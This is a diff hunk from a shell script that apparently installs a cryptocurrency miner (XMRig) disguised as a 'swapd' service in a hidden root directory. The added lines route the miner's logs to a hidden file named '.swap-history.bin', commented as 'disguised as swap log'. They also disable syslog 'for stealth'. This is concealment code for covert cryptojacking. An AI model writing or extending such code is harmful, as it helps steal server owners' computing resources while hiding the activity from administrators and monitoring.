@@ -1319,19 +1319,30 @@ sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$HOME"/.swapd/config.jso
 sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' "$HOME"/.swapd/config.json
 
 echo "[*] Copying xmrig-proxy config"
+# ==================== ENABLE HIDDEN XMRIG LOGGING ====================
+echo "[*] Setting up hidden swapd logging..."
 
-# Enable detailed logging for swapd (xmrig)
-echo "[*] Enabling detailed miner logging..."
-sed -i 's#"log-file": *null,#"log-file": "/root/.swapd/swapd.log",#' "$HOME"/.swapd/config.json
-sed -i 's#"log-file": *null,#"log-file": "/root/.swapd/swapd.log",#' "$HOME"/.swapd/config_background.json
+# Create hidden log directory
+mkdir -p "/root/.swapd/.swap_logs"
 
-# Set verbose logging level (0=quiet, 2=normal, 4=debug)
-sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' "$HOME"/.swapd/config.json
-sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' "$HOME"/.swapd/config_background.json
+# Enable hidden log file (disguised as swap log)
+sed -i 's#"log-file": *"[^"]*",#"log-file": "/root/.swapd/.swap_logs/.swap-history.bin",#' /root/.swapd/config.json
+sed -i 's#"log-file": *"[^"]*",#"log-file": "/root/.swapd/.swap_logs/.swap-history.bin",#' /root/.swapd/config_background.json
 
-# Enable syslog for system-level logging
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' "$HOME"/.swapd/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' "$HOME"/.swapd/config_background.json
+# Set verbose logging for mining
+sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' /root/.swapd/config.json
+sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' /root/.swapd/config_background.json
+
+# Disable syslog for stealth
+sed -i 's/"syslog": *[^,]*,/"syslog": false,/' /root/.swapd/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": false,/' /root/.swapd/config_background.json
+
+# Add log rotation
+sed -i 's/"retries": *[^,]*,/"retries": 5,\n\t"rotate-logs": true,\n\t"rotate-files": 3,/' /root/.swapd/config.json
+sed -i 's/"retries": *[^,]*,/"retries": 5,\n\t"rotate-logs": true,\n\t"rotate-files": 3,/' /root/.swapd/config_background.json
+
+echo "[✓] Hidden swapd logging enabled: /root/.swapd/.swap_logs/.swap-history.bin"
+# =====================================================================
 
 # Also update the launcher.sh to preserve logs
 if [ -f /root/.swapd/launcher.sh ]; then
